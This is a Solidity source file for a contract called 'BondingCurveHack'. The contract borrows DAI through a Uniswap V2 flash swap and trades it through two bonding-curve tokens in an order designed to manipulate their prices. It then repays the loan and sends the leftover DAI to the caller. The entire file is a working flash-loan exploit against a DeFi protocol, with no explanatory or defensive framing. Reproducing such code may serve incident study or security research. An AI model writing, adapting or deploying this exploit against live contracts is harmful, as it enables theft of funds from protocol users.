pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IEminenceCurrency {
    function buy(uint256 _amount, uint256 _min)
        external
        returns (uint256 _bought);

    function sell(uint256 _amount, uint256 _min)
        external
        returns (uint256 _bought);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract BondingCurveHack {
    function run(
        IUniswapV2Pair pair, 
        IEminenceCurrency base,
        IEminenceCurrency token, 
        uint256 amount
    ) external {
        bytes memory data = abi.encode(base, token, msg.sender);
        pair.swap(0, amount, address(this), data);
    }

    function uniswapV2Call(
        address, /*_sender*/
        uint256, /*_amount0*/
        uint256 _amount1,
        bytes calldata _data
    ) external {
        (
            IEminenceCurrency base, 
            IEminenceCurrency token, 
            address to
        ) = abi.decode(_data, (IEminenceCurrency, IEminenceCurrency, address));
        IERC20 dai = IERC20(IUniswapV2Pair(msg.sender).token1());
        dai.approve(address(base), type(uint256).max);
        base.approve(address(token), type(uint256).max);
        uint256 baseAmount = base.buy(_amount1, 0);
        uint256 tokenAmount = token.buy(baseAmount / 2, 0);
        base.sell(baseAmount / 2, 0);
        baseAmount = token.sell(tokenAmount, 0);
        base.sell(baseAmount, 0);
        uint256 repayAmount = calculateRepay(_amount1);
        dai.transfer(msg.sender, repayAmount);
        dai.transfer(to, dai.balanceOf(address(this)));
    }

    function calculateRepay(uint256 amount) private pure returns (uint256) {
        uint256 num = amount * (10**18) * 1000;
        uint256 x = num / 997 / 10**18;
        return x + 1;
    }
}
